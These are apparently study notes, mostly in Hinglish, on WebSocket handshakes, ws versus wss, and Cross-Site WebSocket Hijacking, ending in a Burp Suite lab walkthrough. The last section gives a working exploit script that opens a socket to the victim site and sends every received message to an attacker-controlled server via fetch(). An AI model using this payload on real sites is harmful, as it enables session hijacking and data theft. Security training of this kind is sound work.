WebSocket is a protocol that provides full-duplex (two-way) communication channels over a single TCP connection. Unlike HTTP, the connection stays open, allowing the server to push data to the client instantly.

**The Handshake**( Websocket handsake )

- It starts with a standard HTTP request containing the `Upgrade: websocket` header.
    
- If the server agrees, it responds with `HTTP 101 Switching Protocols`.
    
- After this, the HTTP connection is replaced by a persistent WebSocket connection.

**Step 1: The Request (Client -> Server)** Browser server se kehta hai: _"Hello! Main HTTP baat kar raha hoon, kya hum **WebSocket** par switch kar sakte hain?"_

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

**Step 2: The Response (Server -> Client)** Server kehta hai: _"Theek hai, chalo switch karte hain."_

```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```


![[Screenshot (40).png]]

**HTTP vs WebSocket**

- **HTTP:** Request-Response model. The client must ask for data. High overhead (headers sent every time).
    
- **WebSocket:** Event-driven model. Server can send data anytime. Low overhead (connection stays alive).


**Security Risk: CSWSH (Cross-Site WebSocket Hijacking)**

- Just like CSRF, WebSockets are vulnerable if they rely solely on cookies for authentication.
    
- An attacker can initiate a WebSocket handshake from a malicious site. The browser sends the victim's cookies automatically.
    
- **Defense:** The server must validate the `Origin` header during the handshake to ensure the request comes from a trusted domain.
    

---

**1. WS (WebSocket)**

- **Protocol:** Uses the `ws://` scheme.
    
- **Encryption:** No encryption. Data is sent in plain text.
    
- **Vulnerability:** Susceptible to Man-in-the-Middle (MitM) attacks and sniffing. Anyone on the network can see the payload.

**2. WSS (WebSocket Secure)**

- **Protocol:** Uses the `wss://` scheme.
- **Encryption:** Encrypted using **TLS/SSL** (Transport Layer Security).
- **Reliability:** It is safer and more reliable because proxies and firewalls often block unencrypted `ws` traffic but allow encrypted `wss` traffic (since it looks like HTTPS).


## **The Vulnerability: Cross-Site WebSocket Hijacking (CSWSH)**

Yeh vulnerability bilkul **CSRF** jaisi hai, bas medium alag hai.

### **Why it happens?**

Server handshake ke waqt sirf **Cookies** par bharosa karta hai user ko pehchanne ke liye, lekin yeh check karna bhool jata hai ki request **"Kaunsi Website"** se aa rahi hai (`Origin` header check nahi karta).

### **The Attack Scenario**

1. **Victim** `bank.com` par logged in hai.
    
2. **Attacker** victim ko `evil.com` par bulata hai.
    
3. `evil.com` ki JavaScript background mein `wss://bank.com/chat` par connection banati hai.
    
4. Kyuki ye ek "Cross-Site" request hai, Browser automatically **Victim ki Cookies** saath bhej deta hai.
    
5. Server cookies dekhta hai, connection accept kar leta hai.
    
6. Ab Attacker ka script Victim ke naam par chat/actions perform kar sakta hai.



## **Lab Walkthrough: Manipulating the Handshake**

**Goal:** Hamein check karna hai ki kya server `Origin` header ko validate kar raha hai ya nahi.

### **Step 1: Intercept & Analyze**

1. Burp Suite proxy on karo.
    
2. Website par koi WebSocket action perform karo (jaise "Live Chat").
    
3. **HTTP History** mein jao aur wo request dhundo jisme **Status Code 101** hai. (Ye Handshake request hai).


### **Step 2: Test for Vulnerability (Repeater)**

1. Request ko **Repeater** mein bhejo.
    
2. Headers mein `Origin` header dhundo.
    
    - Original: `Origin: https://target-site.com`
        
3. **Change it:** Isse badal kar kuch aur kar do.
    
    - Modified: `Origin: https://attacker.com`
        
4. **Send:** Request bhejo.
    
5. **Result:**
    
    - Agar server `403 Forbidden` deta hai -> **Secure** ✅.
        
    - Agar server abhi bhi `101 Switching Protocols` deta hai -> **Vulnerable** ❌.
        

### **Step 3: Create Exploit (Exploit Server)**

Agar server `Origin` check nahi kar raha, to hum exploit banayenge.

**The Script (JavaScript Injection):** Humein ek script likhni hai jo connection banaye aur message bheje.

<script>
    // 1. Connection banao (WSS URL use karo)
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

    // 2. Connection khulte hi kya karna hai?
    ws.onopen = function() {
        // Victim ke naam par message bhejo
        ws.send("READY"); 
    };

    // 3. Agar Server jawab de to kya karna hai? (Exfiltration)
    ws.onmessage = function(event) {
        // Data Attacker ke server par bhejo
        fetch('https://YOUR-EXPLOIT-SERVER-ID?loot=' + event.data);
    };
</script>